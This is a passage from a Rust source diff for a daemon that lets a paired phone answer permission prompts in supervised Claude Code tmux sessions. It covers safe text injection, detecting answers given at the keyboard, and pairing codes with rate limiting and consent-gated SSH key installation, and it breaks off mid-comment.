+        let require = self.with_needle_overrides(PromptPresence::InputBox);
+        let outcome = self
+            .supervisor_request(
+                &session_uid,
+                SupervisorRequest::SendText {
+                    text,
+                    require,
+                    submit,
+                    // Free text is not an answer to a prompt; the composer being
+                    // ready is the whole interlock, and a permission prompt on
+                    // screen makes that check fail on its own.
+                    expect: None,
+                },
+            )
+            .await;
+
+        let result = match outcome {
+            Ok(SupervisorResult::Sent { matched }) => SendTextResult::Sent { matched },
+            // A refusal is a positive statement that nothing was typed — the
+            // supervisor checks before it injects, never after.
+            Ok(SupervisorResult::Refused { reason }) => SendTextResult::Refused { reason },
+            // Anything else means we never found out. It may have typed, and no
+            // later evidence can settle it, so it is reported as unknown rather
+            // than as a refusal a retry would act on.
+            Ok(other) => SendTextResult::Indeterminate {
+                reason: format!("unexpected supervisor result: {other:?}"),
+            },
+            // Never handed to a supervisor, so nothing was typed and a retry is
+            // a fresh attempt rather than a permanent unknown.
+            Err(SupervisorFailure::NotSent(reason)) => SendTextResult::Refused { reason },
+            Err(SupervisorFailure::Unanswered(reason)) => SendTextResult::Indeterminate {
+                reason: format!("the supervisor never confirmed this injection ({reason})"),
+            },
+        };
+
+        if let Some((request_id, _)) = &identity {
+            match &result {
+                SendTextResult::Sent { matched } => {
+                    if let Err(err) = self
+                        .db
+                        .settle_text_mutation(
+                            session_uid.clone(),
+                            request_id.to_string(),
+                            matched.to_string(),
+                            protocol::time::now_rfc3339(),
+                        )
+                        .await
+                    {
+                        // The claim stays `applying`, so a retry is told
+                        // "unknown" rather than typing a second time.
+                        crate::log_error!("could not settle send_text {request_id}: {err:#}");
+                    }
+                }
+                // Nothing was typed, so the claim is released and a later retry
+                // is a fresh attempt rather than a permanent "I do not know".
+                SendTextResult::Refused { .. } => {
+                    if let Err(err) = self
+                        .db
+                        .release_text_mutation(session_uid.clone(), request_id.to_string())
+                        .await
+                    {
+                        crate::log_error!("could not release send_text {request_id}: {err:#}");
+                    }
+                }
+                // Left claimed on purpose: an unconfirmed injection must not
+                // become answerable again.
+                _ => crate::log_error!(
+                    "send_text {request_id} was never confirmed; leaving it claimed so a retry \
+                     is told so rather than typing again"
+                ),
+            }
+        }
+        result
+    }
+
+    pub async fn capture(&self, session_ref: &str, lines: u32) -> Result<String> {
+        let session_uid = self.resolve(session_ref).await?.session_uid;
+        self.capture_run(&session_uid, lines).await
+    }
+
+    /// A snapshot for a human to read: scrollback included.
+    async fn capture_run(&self, session_uid: &str, lines: u32) -> Result<String> {
+        self.capture_pane(session_uid, lines, false).await
+    }
+
+    /// A snapshot for the daemon to *decide* from: the visible pane and nothing
+    /// else.
+    ///
+    /// Every presence and identity check goes through here. A prompt that has
+    /// scrolled out of view is history, and history must never authorise a
+    /// keystroke: the answer to a question a human answered ten minutes ago
+    /// would otherwise be typed into whatever is on screen now.
+    async fn capture_visible(&self, session_uid: &str) -> Result<String> {
+        self.capture_pane(session_uid, 0, true).await
+    }
+
+    async fn capture_pane(
+        &self,
+        session_uid: &str,
+        lines: u32,
+        visible_only: bool,
+    ) -> Result<String> {
+        match self
+            .supervisor_request(
+                session_uid,
+                SupervisorRequest::Capture {
+                    lines,
+                    visible_only,
+                },
+            )
+            .await?
+        {
+            SupervisorResult::Snapshot { text } => Ok(text),
+            other => Err(anyhow!("unexpected supervisor result: {other:?}")),
+        }
+    }
+
+    // ----------------------------------------------------------- supervisors
+
+    /// Register (or re-register) a session's supervisor.
+    ///
+    /// Returns the run's key so the connection can be tied to a *uid*: the
+    /// socket is what tells us the supervisor went away, and unregistering by
+    /// name would detach whichever run currently holds it.
+    pub async fn register_supervisor(
+        &self,
+        info: RegisterSession,
+        tx: mpsc::Sender<DaemonFrame>,
+        inflight: Arc<std::sync::Mutex<HashMap<String, oneshot::Sender<SupervisorResult>>>>,
+    ) -> Result<Registration> {
+        let now = protocol::time::now_rfc3339();
+        let existing = self
+            .lookup_run(&info.session_id, info.session_uid.as_deref())
+            .await?;
+        let uid = match (&existing, &info.session_uid) {
+            (Some(row), _) => row.session_uid.clone(),
+            (None, Some(uid)) if protocol::uid::is_well_formed(uid) => uid.clone(),
+            (None, _) => {
+                let uid = protocol::uid::new()?;
+                crate::log_info!(
+                    "supervisor for {} registered without a uid; adopting it as {uid}",
+                    info.session_id
+                );
+                uid
+            }
+        };
+
+        self.db
+            .upsert_session(SessionRow {
+                session_uid: uid.clone(),
+                session_id: info.session_id.clone(),
+                tmux_session: info.tmux_session.clone(),
+                tmux_socket: info.tmux_socket.clone(),
+                cwd: info.cwd.clone(),
+                claude_session_id: None,
+                transcript_path: None,
+                lifecycle: Lifecycle::Live,
+                created_at: existing
+                    .as_ref()
+                    .map(|r| r.created_at.clone())
+                    .unwrap_or_else(|| info.started_at.clone()),
+                updated_at: now,
+            })
+            .await?;
+
+        let session = SessionKey::new(uid, info.session_id.clone());
+        let epoch = {
+            let mut inner = self.inner.lock().await;
+            inner.next_epoch += 1;
+            let epoch = inner.next_epoch;
+            inner.supervisors.insert(
+                session.uid.clone(),
+                SupervisorHandle {
+                    tx,
+                    inflight,
+                    next_id: Arc::new(std::sync::atomic::AtomicU64::new(1)),
+                    epoch,
+                    protocol_minor: info.protocol_minor,
+                },
+            );
+            inner
+                .last_seen_ms
+                .insert(session.uid.clone(), protocol::time::now_unix_ms());
+            epoch
+        };
+
+        // Re-attach after a daemon restart is a fact worth logging, not a
+        // session boundary: the agent never stopped running.
+        let pending = PendingEvent::new(
+            &session,
+            EventKind::LinkState,
+            serde_json::json!({"link": "attached", "reason": "supervisor registered"}),
+            Source::Daemon,
+        );
+        self.ingest(pending).await?;
+        crate::log_info!(
+            "supervisor registered for {} ({}) speaking minor {}",
+            session.name,
+            session.uid,
+            info.protocol_minor
+        );
+        // Said once, at the moment it becomes true, rather than at the moment
+        // somebody taps and gets a refusal they cannot explain.
+        if info.protocol_minor < SUPERVISOR_MINOR_PROMPT_IDENTITY {
+            crate::log_warn!(
+                "the supervisor for {} predates prompt identity (minor {} < {}); approvals for \
+                 this session can be viewed remotely but must be answered at the Mac until it is \
+                 restarted",
+                session.name,
+                info.protocol_minor,
+                SUPERVISOR_MINOR_PROMPT_IDENTITY
+            );
+        }
+        Ok(Registration { session, epoch })
+    }
+
+    /// Release a supervisor slot when its connection ends.
+    ///
+    /// Only if it is still *this* registration's slot. A supervisor that
+    /// reconnects registers again under the same uid, and the losing connection's
+    /// teardown can run afterwards — removing blindly would detach the
+    /// supervisor that had just replaced it, leaving a live session with no way
+    /// to be typed into and a `detached` link that never recovers.
+    pub async fn unregister_supervisor(&self, registration: &Registration) {
+        let released = {
+            let mut inner = self.inner.lock().await;
+            match inner.supervisors.get(&registration.session.uid) {
+                Some(handle) if handle.epoch == registration.epoch => {
+                    inner.supervisors.remove(&registration.session.uid);
+                    true
+                }
+                _ => false,
+            }
+        };
+        if !released {
+            crate::log_debug!(
+                "ignoring a stale disconnect for {}: a newer supervisor holds it",
+                registration.session.name
+            );
+            return;
+        }
+        let pending = PendingEvent::new(
+            &registration.session,
+            EventKind::LinkState,
+            serde_json::json!({"link": "detached", "reason": "supervisor disconnected"}),
+            Source::Daemon,
+        );
+        if let Err(err) = self.ingest(pending).await {
+            crate::log_error!("failed to record detach: {err:#}");
+        }
+    }
+
+    pub async fn heartbeat(&self, session_id: &str, session_uid: Option<&str>) {
+        let Ok(Some(row)) = self.lookup_run(session_id, session_uid).await else {
+            return;
+        };
+        self.inner
+            .lock()
+            .await
+            .last_seen_ms
+            .insert(row.session_uid, protocol::time::now_unix_ms());
+    }
+
+    pub async fn session_exited(
+        &self,
+        session_id: &str,
+        session_uid: Option<&str>,
+        exit_code: Option<i32>,
+    ) {
+        // Reported over a *fresh* connection by a supervisor whose session is
+        // already gone, so the run has to be found again rather than inferred
+        // from a socket that no longer exists.
+        //
+        // A supervisor at the current minor replays its registration on that
+        // same connection first (see `cc`'s `report_exit`), which is what makes
+        // a session that started *and* ended while the daemon was down land here
+        // with a row to attach the exit to. Reaching the miss branch therefore
+        // means either an older supervisor or a failed replay, and the two
+        // outcomes below are kept apart because "we looked and it is not there"
+        // and "we could not look" are different facts.
+        let row = match self.lookup_run(session_id, session_uid).await {
+            Ok(Some(row)) => row,
+            Ok(None) => {
+                crate::log_warn!(
+                    "exit reported for {session_id}, which this daemon has no record of; \
+                     it started and ended while ccd was not running and its supervisor did \
+                     not replay a registration"
+                );
+                return;
+            }
+            Err(err) => {
+                crate::log_error!(
+                    "exit reported for {session_id} but the session could not be looked up \
+                     ({err:#}); the run's final state is unknown"
+                );
+                return;
+            }
+        };
+        let session = row.key();
+        if let Err(err) = self
+            .db
+            .set_lifecycle(session.uid.clone(), Lifecycle::Exited)
+            .await
+        {
+            crate::log_error!("failed to mark {} exited: {err:#}", session.name);
+        }
+        let pending = PendingEvent::new(
+            &session,
+            EventKind::SessionEnd,
+            serde_json::json!({"exit_code": exit_code}),
+            Source::Daemon,
+        );
+        if let Err(err) = self.ingest(pending).await {
+            crate::log_error!("failed to record exit: {err:#}");
+        }
+    }
+
+    /// Ask the supervisor for something, and be precise about failure.
+    ///
+    /// The two failure kinds are not a nicety. A request that never left this
+    /// process cannot have typed anything; one that was sent and never answered
+    /// might have. Only the first may be retried, and a caller handed a single
+    /// opaque error has no way to tell which it is holding.
+    async fn supervisor_request(
+        &self,
+        session_uid: &str,
+        request: SupervisorRequest,
+    ) -> std::result::Result<SupervisorResult, SupervisorFailure> {
+        let (slot, tx, rx) = {
+            let inner = self.inner.lock().await;
+            let Some(handle) = inner.supervisors.get(session_uid) else {
+                return Err(SupervisorFailure::NotSent(format!(
+                    "no supervisor attached for {session_uid}"
+                )));
+            };
+            let id = handle
+                .next_id
+                .fetch_add(1, std::sync::atomic::Ordering::Relaxed)
+                .to_string();
+            let (response_tx, response_rx) = oneshot::channel();
+            handle
+                .inflight
+                .lock()
+                .unwrap_or_else(|p| p.into_inner())
+                .insert(id.clone(), response_tx);
+            // From here on the entry is owned by a guard, so every exit path
+            // below — refused send, timeout, dropped channel, or a panic —
+            // removes it. It used to be removed only by a *reply*, which meant
+            // every timed-out request left a `oneshot::Sender` in the map
+            // forever: one entry per abandoned capture, on a supervisor that
+            // lives as long as its session, growing without any bound and with
+            // nothing that would ever collect it.
+            let slot = InflightSlot {
+                id,
+                inflight: Arc::clone(&handle.inflight),
+            };
+            (slot, handle.tx.clone(), response_rx)
+        };
+
+        // `try_send` rather than an await: the queue is bounded now, and
+        // blocking the answer path on a supervisor that has stopped reading is
+        // exactly the stall this is meant to avoid. Both refusals — full and
+        // closed — mean the frame never left this process, which is precisely
+        // what `NotSent` promises its caller.
+        if let Err(err) = tx.try_send(DaemonFrame::SupervisorRequest {
+            id: slot.id.clone(),
+            request,
+        }) {
+            return Err(SupervisorFailure::NotSent(match err {
+                mpsc::error::TrySendError::Full(_) => {
+                    format!("the supervisor for {session_uid} is not reading its requests")
+                }
+                mpsc::error::TrySendError::Closed(_) => {
+                    format!("supervisor for {session_uid} is gone")
+                }
+            }));
+        }
+
+        match tokio::time::timeout(Duration::from_millis(self.config.supervisor_timeout_ms), rx)
+            .await
+        {
+            Ok(Ok(result)) => Ok(result),
+            // Both of these are "it was sent and we never heard back". The
+            // supervisor may have acted before it stopped answering.
+            Ok(Err(_)) => Err(SupervisorFailure::Unanswered(
+                "the supervisor dropped the request".into(),
+            )),
+            Err(_) => Err(SupervisorFailure::Unanswered(
+                "the supervisor did not answer in time".into(),
+            )),
+        }
+    }
+
+    // -------------------------------------------------------------- queries
+
+    pub async fn sessions(&self) -> Result<Vec<SessionSummary>> {
+        let rows = self.db.list_sessions().await?;
+        let inner = self.inner.lock().await;
+        let now = protocol::time::now_unix_ms();
+        let mut out = Vec::with_capacity(rows.len());
+        for row in rows {
+            let attached = inner.supervisors.contains_key(&row.session_uid);
+            let last_seen = inner.last_seen_ms.get(&row.session_uid).copied();
+            // Positive liveness only: silence is `stale`, never `idle`.
+            let link = match (attached, last_seen) {
+                (false, _) => Link::Detached,
+                (true, Some(ms)) if now - ms > self.config.stale_after_ms as i64 => Link::Stale,
+                (true, Some(_)) => Link::Attached,
+                (true, None) => Link::Degraded,
+            };
+            let blocked_on = inner
+                .pending
+                .values()
+                .filter(|p| p.session.uid == row.session_uid)
+                .map(|p| p.card.request_id.clone())
+                .collect();
+            out.push(SessionSummary {
+                session_uid: row.session_uid.clone(),
+                session_id: row.session_id.clone(),
+                tmux_session: row.tmux_session,
+                cwd: row.cwd,
+                lifecycle: row.lifecycle,
+                link,
+                claude_session_id: row.claude_session_id,
+                transcript_path: row.transcript_path,
+                last_seq: self.db.max_seq(row.session_uid.clone()).await?,
+                created_at: row.created_at,
+                updated_at: row.updated_at,
+                blocked_on,
+            });
+        }
+        Ok(out)
+    }
+
+    /// Expire approvals nobody answered, so `blocked_on` reflects reality.
+    pub async fn expire_stale_approvals(&self, max_age_ms: i64) {
+        let now = protocol::time::now_unix_ms();
+        let expired: Vec<(String, SessionKey)> = {
+            let inner = self.inner.lock().await;
+            inner
+                .pending
+                .iter()
+                .filter(|(_, p)| !p.claimed && now - p.created_ms > max_age_ms)
+                .map(|((_, request_id), p)| (request_id.clone(), p.session.clone()))
+                .collect()
+        };
+        for (request_id, session) in expired {
+            self.resolve_without_phone(
+                &request_id,
+                &session,
+                AnswerDecision::Deny,
+                ResolvedBy::Timeout,
+                "expired without an answer; local operator owns it",
+                // The daemon never observed an answer, and says so.
+                true,
+            )
+            .await;
+        }
+    }
+
+    // ------------------------------------------------- local resolution
+
+    /// Notice approvals that were answered at the Mac's keyboard.
+    ///
+    /// Two signals, in decreasing order of confidence:
+    ///
+    /// 1. **A tool result arrived** for the request. The call ran, so it was
+    ///    approved. That is an observation, and the decision it implies is a
+    ///    fact rather than a guess.
+    /// 2. **The prompt left the pane and the composer came back.** All this
+    ///    proves is that the prompt was dismissed — not what was chosen — so the
+    ///    recorded decision is marked `inferred` and the phone is expected to
+    ///    render "answered at the keyboard" from `resolved_by`, not to present
+    ///    the decision as fact.
+    ///
+    /// Getting this wrong in the *other* direction is the expensive mistake:
+    /// resolving an approval the human has not answered would make the card
+    /// vanish from the phone while the Mac still waits. Everything defensive
+    /// here exists for that one failure — the grace period, the two consecutive
+    /// observations, requiring the composer's return rather than accepting the
+    /// prompt's absence, and treating an unreadable pane as no evidence at all.
+    pub async fn sweep_local_resolutions(&self) {
+        if !self.config.local_resolve {
+            return;
+        }
+        let now = protocol::time::now_unix_ms();
+        let grace = self.config.local_resolve_grace_ms as i64;
+
+        // Snapshot first: capturing a pane is a subprocess round-trip and must
+        // not happen with the state lock held.
+        let candidates: Vec<(String, SessionKey, bool, i64)> = {
+            let inner = self.inner.lock().await;
+            inner
+                .pending
+                .iter()
+                .filter(|(_, p)| !p.claimed)
+                .map(|((_, request_id), p)| {
+                    (
+                        request_id.clone(),
+                        p.session.clone(),
+                        p.tool_ran,
+                        p.created_ms,
+                    )
+                })
+                .collect()
+        };
+        if candidates.is_empty() {
+            return;
+        }
+
+        // The tool ran: resolve immediately, no pane reading required.
+        for (request_id, session, _, _) in candidates.iter().filter(|(_, _, ran, _)| *ran) {
+            self.resolve_without_phone(
+                request_id,
+                session,
+                AnswerDecision::Allow,
+                ResolvedBy::Local,
+                "the tool ran, so it was approved at the keyboard",
+                false,
+            )
+            .await;
+        }
+
+        // One capture per run, however many approvals are outstanding on it.
+        let mut sessions: Vec<SessionKey> = candidates
+            .iter()
+            .filter(|(_, _, tool_ran, created)| !tool_ran && now - created > grace)
+            .map(|(_, session, _, _)| session.clone())
+            .collect();
+        sessions.sort_by(|a, b| a.uid.cmp(&b.uid));
+        sessions.dedup_by(|a, b| a.uid == b.uid);
+
+        for session in sessions {
+            // Visible pane only. With scrollback, a permission prompt answered
+            // ten minutes ago is still "on screen" as far as a needle search is
+            // concerned — which would freeze this detector permanently *and*, on
+            // the answer path, authorise typing into whatever replaced it.
+            let Ok(pane) = self.capture_visible(&session.uid).await else {
+                // No supervisor, or capture failed. We cannot see the screen,
+                // so we know nothing — which is not the same as "the prompt is
+                // gone", and must not be treated as it.
+                continue;
+            };
+            // Positive evidence, not merely absence. "The permission prompt is
+            // gone" is also true when the operator switched tmux windows, when
+            // the pane is mid-redraw, or when a long tool is still running —
+            // and resolving on any of those would clear a card the human has
+            // not answered, which is the one failure this must not have.
+            // "The prompt is gone *and* the composer is accepting input again"
+            // only happens after the prompt was actually dismissed.
+            let prompt_visible = self
+                .with_needle_overrides(PromptPresence::PermissionPrompt)
+                .find_match(&pane, None)
+                .is_some();
+            let composer_ready = self
+                .with_needle_overrides(PromptPresence::InputBox)
+                .find_match(&pane, None)
+                .is_some();
+            let answered_locally = !prompt_visible && composer_ready;
+
+            // A prompt *is* on screen and some card here has no identity yet —
+            // a restart recovered it, or the settle poll ran out of attempts.
+            // This is the "recover against the current visible prompt" half:
+            // the card becomes answerable again only once we can see, and
+            // fingerprint, what it is answering.
+            if prompt_visible {
+                let unbound: Vec<(String, u64)> = {
+                    let inner = self.inner.lock().await;
+                    inner
+                        .pending
+                        .iter()
+                        .filter(|((uid, _), entry)| {
+                            uid == &session.uid && entry.prompt.is_none() && !entry.claimed
+                        })
+                        .map(|((_, request_id), entry)| (request_id.clone(), entry.generation))
+                        .collect()
+                };
+                // Only when exactly one card is waiting. With two, "the prompt on
+                // screen" does not say which of them it belongs to, and binding
+                // both to it would be the very confusion this exists to prevent.
+                if let [(request_id, generation)] = unbound.as_slice() {
+                    self.bind_prompt_identity(&session, request_id, *generation, &pane)
+                        .await;
+                }
+            }
+
+            let resolved: Vec<String> = {
+                let mut inner = self.inner.lock().await;
+                let mut resolved = Vec::new();
+                for ((uid, request_id), entry) in inner.pending.iter_mut() {
+                    if uid != &session.uid
+                        || entry.claimed
+                        || entry.tool_ran
+                        || now - entry.created_ms <= grace
+                    {
+                        continue;
+                    }
+                    if answered_locally {
+                        entry.local_misses += 1;
+                        if entry.local_misses >= LOCAL_RESOLVE_MISSES {
+                            resolved.push(request_id.clone());
+                        }
+                    } else {
+                        entry.local_misses = 0;
+                    }
+                }
+                resolved
+            };
+
+            for request_id in resolved {
+                self.resolve_without_phone(
+                    &request_id,
+                    &session,
+                    AnswerDecision::Deny,
+                    ResolvedBy::Local,
+                    "the prompt left the screen without CodeConnect typing into it; \
+                     answered at the keyboard, outcome not observed",
+                    true,
+                )
+                .await;
+            }
+        }
+    }
+
+    /// Retire an approval that the phone did not answer.
+    ///
+    /// Writing to the ledger is the load-bearing half: without it a tap that
+    /// arrives seconds later would be applied to whatever is on screen by then.
+    /// The event is what the phone renders.
+    async fn resolve_without_phone(
+        &self,
+        request_id: &str,
+        session: &SessionKey,
+        decision: AnswerDecision,
+        resolved_by: ResolvedBy,
+        detail: &str,
+        inferred: bool,
+    ) {
+        // Claim by removal: whoever takes the entry out of the map owns the
+        // resolution, so a phone answer racing this either finds the entry (and
+        // wins) or finds the ledger (and is a well-formed duplicate).
+        //
+        // A *claimed* entry is left alone: the phone is mid-injection, and its
+        // answer is the better record. If that injection then fails the entry is
+        // unclaimed again and the next sweep picks it up.
+        let id: ApprovalId = (session.uid.clone(), request_id.to_string());
+        let taken = {
+            let mut inner = self.inner.lock().await;
+            match inner.pending.get(&id) {
+                Some(entry) if entry.claimed => false,
+                Some(_) => inner.pending.remove(&id).is_some(),
+                None => false,
+            }
+        };
+        if !taken {
+            return;
+        }
+
+        let outcome = AnswerOutcome {
+            request_id: request_id.to_string(),
+            session_id: session.name.clone(),
+            decision,
+            resolved_by,
+            applied_via: AnswerPath::SendKeys,
+            resolved_at: protocol::time::now_rfc3339(),
+            detail: Some(detail.to_string()),
+            inferred,
+            indeterminate: false,
+        };
+        if let Err(err) = self
+            .store
+            .record_answer(&session.uid, request_id, "", &outcome)
+        {
+            crate::log_error!("failed to record resolution for {request_id}: {err:#}");
+        }
+        let _ = self
+            .db
+            .delete_pending_approval(session.uid.clone(), request_id.to_string())
+            .await;
+        crate::log_info!("{request_id} resolved by {resolved_by:?}: {detail}");
+
+        let pending = PendingEvent::new(
+            session,
+            EventKind::ApprovalResolved,
+            serde_json::to_value(&outcome).unwrap_or(serde_json::Value::Null),
+            Source::Daemon,
+        )
+        .with_source_event_id(format!("resolved:{request_id}"));
+        if let Err(err) = self.ingest(pending).await {
+            crate::log_error!("failed to record resolution event: {err:#}");
+        }
+    }
+
+    // ------------------------------------------------------------ diff
+
+    /// `git diff HEAD` for a session's working directory.
+    ///
+    /// The client names a *session*, never a path: the directory comes from our
+    /// own registry, so no request can aim this at an arbitrary place on the
+    /// filesystem.
+    pub async fn diff(&self, session_ref: &str) -> Result<crate::git::Diff> {
+        let row = self.resolve(session_ref).await?;
+        Ok(crate::git::collect(
+            &row.cwd,
+            self.config.git_bin.as_deref(),
+            self.config.diff_max_bytes,
+            Duration::from_millis(self.config.diff_timeout_ms),
+        )
+        .await)
+    }
+
+    // --------------------------------------------------------- pairing
+
+    /// Mint a single-use pairing code. Only the hash is stored.
+    pub async fn create_pairing(&self, ttl_secs: u64, allow_ssh: bool) -> Result<(String, String)> {
+        let code = crate::secret::pairing_code()?;
+        let now_ms = protocol::time::now_unix_ms();
+        let expires_ms = now_ms + (ttl_secs as i64) * 1000;
+        let expires_at = protocol::time::rfc3339_from_unix_ms(expires_ms);
+        self.db
+            .create_pairing_code(
+                sha256_hex(code.as_bytes()),
+                allow_ssh,
+                expires_at.clone(),
+                expires_ms,
+                now_ms,
+            )
+            .await?;
+        crate::log_info!(
+            "pairing code issued, valid until {expires_at}{}",
+            if allow_ssh {
+                " (SSH key installation permitted for this code)"
+            } else {
+                ""
+            }
+        );
+        Ok((code, expires_at))
+    }
+
+    /// Authenticate a `hello`.
+    ///
+    /// A token wins over a pairing code when both are offered: re-pairing an
+    /// already-paired phone would mint a second credential for one device and
+    /// leave the first one live but unlisted against it.
+    pub async fn authenticate(
+        &self,
+        static_token: &str,
+        token: Option<&str>,
+        pairing_code: Option<&str>,
+        ssh_pubkey: Option<&str>,
+        client_name: Option<&str>,
+    ) -> AuthOutcome {
+        if let Some(token) = token.filter(|t| !t.is_empty()) {
+            if constant_time_eq(token.as_bytes(), static_token.as_bytes()) {
+                return AuthOutcome::Static;
+            }
+            return match self
+                .db
+                .device_by_token_hash(sha256_hex(token.as_bytes()))
+                .await
+            {
+                Ok(Some(device)) => {
+                    let _ = self
+                        .db
+                        .touch_device(device.device_id.clone(), protocol::time::now_rfc3339())
+                        .await;
+                    AuthOutcome::Device(Box::new(device))
+                }
+                Ok(None) => AuthOutcome::Rejected("token matches no device".into()),
+                Err(err) => AuthOutcome::Rejected(format!("device lookup failed: {err:#}")),
+            };
+        }
+
+        let Some(code) = pairing_code else {
+            return AuthOutcome::Rejected(
+                "hello carried neither a token nor a pairing code".into(),
+            );
+        };
+        self.pair(code, ssh_pubkey, client_name).await
+    }
+
+    async fn pair(
+        &self,
+        code: &str,
+        ssh_pubkey: Option<&str>,
+        client_name: Option<&str>,
+    ) -> AuthOutcome {
+        let now_ms = protocol::time::now_unix_ms();
+        if !self.admit_pairing_attempt(now_ms).await {
+            // Loud: a human pairs a phone by typing one code. Reaching this
+            // limit is not a user having a bad day, it is something guessing.
+            crate::log_warn!(
+                "PAIRING RATE LIMIT: refusing further attempts; {} failures inside {}s. If you \
+                 did not just mistype a code, something is guessing at this daemon.",
+                self.config.pairing_max_attempts,
+                self.config.pairing_window_secs,
+            );
+            // The same opaque refusal every other failure gets. Telling a peer
+            // it is being rate-limited hands it the one thing it needs to pace
+            // itself under the limit.
+            return AuthOutcome::Rejected("too many pairing attempts".into());
+        }
+        let outcome = self.pair_once(code, ssh_pubkey, client_name).await;
+        if matches!(outcome, AuthOutcome::Rejected(_)) {
+            self.record_pairing_failure(now_ms).await;
+        }
+        outcome
+    }
+
+    /// May another pairing attempt be made right now?
+    ///
+    /// A pairing code carries real entropy and lives five minutes, so this is
+    /// not what stops a *guess* — it is what stops an unbounded *number* of
+    /// guesses. The safety argument for a short-lived code is "you cannot try
+    /// enough of them in five minutes", and that argument is only true if
+    /// something is counting.
+    ///
+    /// Global rather than per-peer, deliberately. There is one operator and
+    /// pairing is a rare, deliberate act at the keyboard, so a global ceiling
+    /// cannot inconvenience a human — while a per-peer limit would be defeated
+    /// by the one thing an attacker on a tailnet can trivially vary.
+    async fn admit_pairing_attempt(&self, now_ms: i64) -> bool {
+        let max = self.config.pairing_max_attempts;
+        if max == 0 {
+            return true;
+        }
+        let window_ms = (self.config.pairing_window_secs as i64).saturating_mul(1_000);
+        let mut inner = self.inner.lock().await;
+        // Pruned on every check rather than on a timer: the deque is bounded by
+        // `max`, so this is a handful of comparisons and there is no sweeper to
+        // forget to schedule.
+        while inner
+            .pairing_failures
+            .front()
+            .is_some_and(|at| now_ms.saturating_sub(*at) >= window_ms)
+        {
+            inner.pairing_failures.pop_front();
+        }
+        (inner.pairing_failures.len() as u32) < max
+    }
+
+    async fn record_pairing_failure(&self, at_ms: i64) {
+        if self.config.pairing_max_attempts == 0 {
+            return;
+        }
+        let mut inner = self.inner.lock().await;
+        inner.pairing_failures.push_back(at_ms);
+        // Only failures are counted, and only `max` of them are ever held: a
+        // successful pairing leaves nothing behind, so a phone that pairs
+        // normally can never push the daemon towards its own limit.
+        while inner.pairing_failures.len() > self.config.pairing_max_attempts as usize {
+            inner.pairing_failures.pop_front();
+        }
+    }
+
+    async fn pair_once(
+        &self,
+        code: &str,
+        ssh_pubkey: Option<&str>,
+        client_name: Option<&str>,
+    ) -> AuthOutcome {
+        let code = protocol::pairing::normalize_code(code);
+        // Shape-checked before the database is touched, so a malformed code
+        // costs a string scan rather than a query.
+        if !protocol::pairing::is_well_formed(&code) {
+            return AuthOutcome::Rejected("malformed pairing code".into());
+        }
+        let allow_ssh = match self
+            .db
+            .consume_pairing_code(sha256_hex(code.as_bytes()), protocol::time::now_unix_ms())
+            .await
+        {
+            Ok(PairingConsume::Consumed { allow_ssh }) => allow_ssh,
+            Ok(PairingConsume::NotFound) => {
+                return AuthOutcome::Rejected("unknown pairing code".into())
+            }
+            Ok(PairingConsume::Expired) => {
+                return AuthOutcome::Rejected("pairing code expired".into())
+            }
+            Ok(PairingConsume::AlreadyUsed) => {
+                return AuthOutcome::Rejected("pairing code already used".into())
+            }
+            Err(err) => return AuthOutcome::Rejected(format!("pairing store failed: {err:#}")),
+        };
+
+        // Past this point the code is spent. Any failure below must therefore
+        // be reported rather than retried with the same code.
+        let outcome = self.mint_device(allow_ssh, ssh_pubkey, client_name).await;
+        match outcome {
+            Ok(outcome) => outcome,
+            Err(err) => {
+                crate::log_error!("pairing consumed a code but failed to complete: {err:#}");
+                AuthOutcome::Rejected(format!("pairing failed: {err:#}"))
+            }
+        }
+    }
+
+    async fn mint_device(
+        &self,
+        allow_ssh: bool,
+        ssh_pubkey: Option<&str>,
+        client_name: Option<&str>,
+    ) -> Result<AuthOutcome> {
+        let device_id = crate::secret::device_id()?;
+        let token = crate::secret::device_token()?;
+        let name = self
+            .db
+            .unique_device_name(client_name.unwrap_or("device").to_string())
+            .await?;
+        self.db
+            .insert_device(
+                device_id.clone(),
+                name.clone(),
+                sha256_hex(token.as_bytes()),
+                protocol::time::now_rfc3339(),
+            )
+            .await?;
+
+        let ssh_key_installed = self
+            .maybe_install_ssh_key(&device_id, &name, allow_ssh, ssh_pubkey)
+            .await;
+        crate::log_info!(
+            "paired device {device_id} ({name}); ssh_key_installed={ssh_key_installed}"
+        );
+        Ok(AuthOutcome::Paired {
+            device_id,
+            device_name: name,
+            token,
+            ssh_key_installed,
+        })
+    }
+
+    /// The consent gate for `~/.ssh/authorized_keys`.
+    ///
+    /// A key is installed only when the operator minted this code with
+    /// `cc pair --ssh`. A key offered against a code without that flag is
+    /// logged and dropped: the phone asking is not consent, and pairing still
+    /// succeeds so the app can fall back to another SSH credential.
+    async fn maybe_install_ssh_key(
+        &self,
+        device_id: &str,
+        device_name: &str,
+        allow_ssh: bool,
+        ssh_pubkey: Option<&str>,
+    ) -> bool {
+        let Some(offered) = ssh_pubkey.filter(|key| !key.trim().is_empty()) else {
+            return false;
+        };
+        if !allow_ssh {
+            crate::log_warn!(
+                "device {device_id} offered an SSH key but this code was not created with \
+                 `cc pair --ssh`; the key was NOT installed"
+            );
+            return false;
+        }
+        let key = match crate::ssh_keys::validate(offered) {
+            Ok(key) => key,
+            Err(err) => {
+                crate::log_warn!("refused the SSH key offered by {device_id}: {err:#}");
+                return false;
+            }
+        };
+        match crate::ssh_keys::install(device_id, device_name, &key) {
+            Ok(installed) => {
+                if installed.replaced {
+                    crate::log_info!(
+                        "device {device_id} already had a key; it was replaced, not duplicated"
+                    );
+                }
+                if let Err(err) = self
+                    .db
+                    .set_ssh_installed(
+                        device_id.to_string(),
+                        true,
+                        Some(installed.fingerprint.clone()),
+                    )
+                    .await
+                {
+                    crate::log_error!("failed to record the SSH key for {device_id}: {err:#}");
+                }
+                true
+            }
+            Err(err) => {
+                crate::log_error!("failed to install the SSH key for {device_id}: {err:#}");
+                false
+            }
+        }
+    }
+
+    /// Every paired device, with its SSH state read from `authorized_keys`.
+    ///
+    /// The whole thing runs on the blocking pool: it is a database read *and* a
+    /// file read per device, and doing either on a runtime worker is the defect
+    /// this indirection removes.
+    pub async fn list_devices(&self) -> Result<Vec<DeviceSummary>> {
+        self.db.device_summaries().await
+    }
+
+    /// Revoke a device's access.
+    ///
+    /// A bare revoke takes away *everything* that device was granted, SSH key
+    /// included: "this phone no longer has access" is what the operator means,
+    /// and leaving a working shell key behind would be a surprise of the worst
+    /// kind. `ssh_only` is the narrower tool for keeping a phone paired while
+    /// dropping its shell access.
+    ///
+    /// **Order is the security property.** This used to remove the SSH key
+    /// first and propagate any error from doing so, which meant an
